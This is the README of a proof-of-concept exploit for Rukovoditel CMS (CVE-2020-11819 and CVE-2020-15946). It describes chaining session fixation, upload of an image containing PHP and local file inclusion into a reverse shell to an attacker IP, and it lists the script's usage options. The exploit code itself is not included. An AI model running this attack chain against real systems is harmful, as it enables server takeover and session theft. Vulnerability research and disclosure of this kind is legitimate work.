# PoC-RCE-Rukovoditel
Proof of concept for CVE-2020-11819 and CVE-2020-15946. Tested on Rukovoditel 2.4.x, 2.5.x and 2.6.1
 
# Description:
This exploit has two modes of execution, using the session fixation vulnerability (CVE-2020-15946) or using the access credentials of any account under any profile. 
With the --type L option, this script will create a malicious link, if the link is accessed in a browser by the victim, an arbitrary session identifier will be set that will be used to steal their session after uploading an image with PHP content on their photo profile, and then use local file include (CVE-2020-11819) to get a nice reverse shell or, with the options --type C -u <username> -p <password> you can provide credentials, load the image with PHP content and use local file inclusion (CVE-2020-11819) to achieve the execution of code. 

Protip: remember to check if the registration module is enabled ;)

# Usage
exploit.py -t <target> -a L --ip attacker IP --port attacker port [options]
exploit.py -t <target> -a C -u <username> -p <password> --ip attacker IP --port attacker port [options]

Post-authenticate RCE for rukovoditel, script version 1.0

optional arguments:  
-h, --help            show this help message and exit  
-t URL, --target URL  URL/Full path to CMS Rukovoditel http://url/path/to/cms/  
-u USER, --user USER  Username for authentication  
-p PASSWORD, --password PASSWORD Password for authentication  
-a TYPE, --type TYPE  Use -a L to generate the link and steal the session or use -a C if you have access credentials to the web application  
--ip IP_ATTACKER      IP attacker for reverse shell!  
--port PORT_ATTACKER  Port for reverse shell connection  
--proxy PROXY         Setup http proxy for debbugin http://127.0.0.1:8080  
